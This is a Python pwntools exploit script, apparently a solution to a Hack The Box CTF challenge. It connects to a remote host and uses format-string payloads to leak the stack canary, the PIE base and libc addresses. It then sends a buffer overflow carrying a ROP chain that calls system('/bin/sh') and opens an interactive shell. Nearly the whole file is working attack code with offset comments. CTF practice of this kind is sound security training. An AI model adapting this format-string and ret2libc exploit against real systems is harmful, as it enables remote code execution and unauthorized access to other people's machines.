from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./what_does_the_f_say")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/CTF/htb/what_does_the_f_say/libc.so.6"}


#p = process("./what_does_the_f_say")
p = remote("209.97.185.157", 31663)
#p = gdb.debug("./what_does_the_f_say", '''break *main
#break *warning+252''')


# Memory Leak: Canary Address
payload = ""
payload += "%13$llx"

# Memory Leak: __libc_csu_init address for PIE Bypess
payload2 = ""
payload2 += "%24$llx"

# Memory Leak: __libc_read+18
payload3 = ""
payload3 += "%3$llx"


# Stack Canary Leak
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()

time.sleep(1)
p.clean()
p.sendline(payload)
canary_leak = int(p.recvline(), 16)

print "Canary leak:", hex(canary_leak)

time.sleep(1)
# PIE Bypass - __libc_csu_init leak setup
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()

# __libc_csu_init leak
time.sleep(1)
p.clean()
p.sendline(payload2)
libc_csu_init_leak = int(p.recvline(), 16)
pie_base = libc_csu_init_leak - 6240

print "libc_csu_init() leak:", hex(libc_csu_init_leak)
print "PIE Base Address:", hex(pie_base)

# libc_read Leak Setup
time.sleep(1)
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()

# libc leak
time.sleep(1)
p.clean()
p.sendline(payload3)
libc_leak = int(p.recvline(), 16)
libc_read = libc_leak - 17
libc_system = libc_read - 0xc0ca0
p.clean()

print "libc leak: ", hex(libc_leak)
print "libc_read() leak:", hex(libc_read)
print "libc_system() leak:", hex(libc_system)

# Spend $ to trigger warning()
for i in range(7):
    p.sendline("2")
    p.clean()
    p.sendline("1")
    p.clean()
    time.sleep(1) # Debugging purposes, race condition errors


# Stack Canary & Overflow Setup
p.sendline("1")
p.recvline()
p.sendline("2")
p.recvline()
p.sendline("Red")
p.recvline()
p.clean()

# 32 bytes overflows RIP
# 8 bytes of "C" padding overflow RBP
# Leave instruction: RBP -> RSP
# Ret -> RSP
# Tested by placing Canary into RAX manually during overflow check.
# \x00 at end of Stack Canary stops overflow @ 32 bytes not allowing
# "C" padding overflows

binsh = libc_read + 0xa3f7a
pop_rdi = pie_base + 0x18bb
ret = pie_base + 0x1016

print "/bin/sh leak:", hex(binsh)
print "ROP Gadget Address:", hex(pop_rdi)

# Stack Canary Bypass
time.sleep(1)
p.clean()
payload4 = ""
payload4 += "A" * 24
payload4 += p64(canary_leak)
payload4 += "C" * 8

payload4 += p64(pop_rdi)
payload4 += p64(binsh)
payload4 += p64(ret)
payload4 += p64(libc_system)

p.sendline(payload4)
p.interactive()
